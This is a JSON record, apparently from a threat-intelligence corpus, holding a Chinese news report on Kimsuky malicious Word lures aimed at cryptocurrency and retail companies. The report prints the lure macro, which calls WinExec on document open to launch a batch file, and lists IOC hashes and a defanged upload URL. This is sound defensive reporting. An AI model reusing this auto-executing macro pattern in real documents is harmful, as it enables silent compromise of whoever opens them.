@@ -1,0 +1,15 @@
+{
+  "doc_id": "kimsuky_020",
+  "target_group": "kimsuky",
+  "source_url": "https://www.freebuf.com/articles/network/326589.html",
+  "source_type": "news_article",
+  "source_name": "FreeBuf",
+  "title": "Kimsuky 针对加密货币公司与零售行业发起攻击",
+  "language": "zh",
+  "raw_text": "3 月 21 日，研究人员发现了 Kimsuky 组织的新攻击行动。Kimsuky 使用加密货币相关信息作为诱饵文件，看样子应该是针对加密货币公司发起的攻击。发现的恶意 Word 文件都是由名为 Acer 的作者创建的：\n\nRegarding Quantity of Stakeholder.doc (修改者: Acer, 修改时间: 2022-03-21 10:29 AM)\nAssets and Liabilities Status.doc (修改者: Acer, 修改时间: 2022-03-21 11:10 AM)\nThe 3rd Stakeholder Meeting.doc (修改者: Acer, 修改时间: 2022-03-21 11:03 AM)﻿\n\n诱饵文档\n\n诱饵文档\n\n诱饵文档\n\n诱饵文档横向比较\n\n所有的诱饵文件都使用相同的宏代码：\n\nPrivate Declare PtrSafe Function NqBHp7qCwNnGUYNUeNUrpXNqBHp7qCwNnGUYNUeNUrpXVpyNeGEx8cxyXNqBHp7qCwNnGUYNUeNUrpXVpyNwqBwFxjyXqyXNqBHp7qCwNnGUYNUeNUrpXVpyNpDYkWbfyp4YLUJGqXtYK3VpyNeGEx8cxyXNqBHp7qCwNnGUYNUeNUrp Lib \"kernel32\" Alias \"WinExec\" (ByVal lpCmdLine As String, ByVal nCmdShow As Long) As Long\nSub Document_Open()\nNqBHp7qCwNnGUYNUeNUrpXNqBHp7qCwNnGUYNUeNUrpXVpyNeGEx8cxyXNqBHp7qCwNnGUYNUeNUrpXVpyNwqBwFxjyXqyXNqBHp7qCwNnGUYNUeNUrpXVpyNpDYkWbfyp4YLUJGqXtYK3VpyNeGEx8cxyXNqBHp7qCwNnGUYNUeNUrp \"C:\\Users\\Public\\Documents\\no1.bat\", 0\nEnd Sub﻿\n\n看起来是由另一个 Wrod 文件来运行 no1.bat，就像过去介绍的那样，由提示用户点击启用宏代码的恶意文档创建的。\n\n恶意文档\n\n研究人员也发现了伪装成产品介绍文件的恶意文档与上面的恶意文档采用相同的分发方式与执行流程，这意味着攻击者也针对零售分销行业发起攻击。\n\nIOC\n0ecc9a4cea5c289732c76234c47a60e9\n82ed73e4adbe5c26bafb-5072657fd46b\n7a2f350a2a6aa1d065c2b19be6dc6fb4\n8a2eeafca1b33010d7ed812cf17d42f5\n869f98aac4963c7db7276d2a914d081e\na872dbb06e2dc721f180d05e2c1c8c20\n56a936b9b3a3bdafed40cf5d056febaf\ndc0223fb97891a90049d0c0d2beeb756\nhttp[://sysrtri-man.com/upl11/upload.php\n参考来源\n\nASEC",
+  "published_date": "2022-03-29",
+  "crawl_time": "2026-07-07T17:20:03Z",
+  "tags": [
+    "基础安全"
+  ]
+}
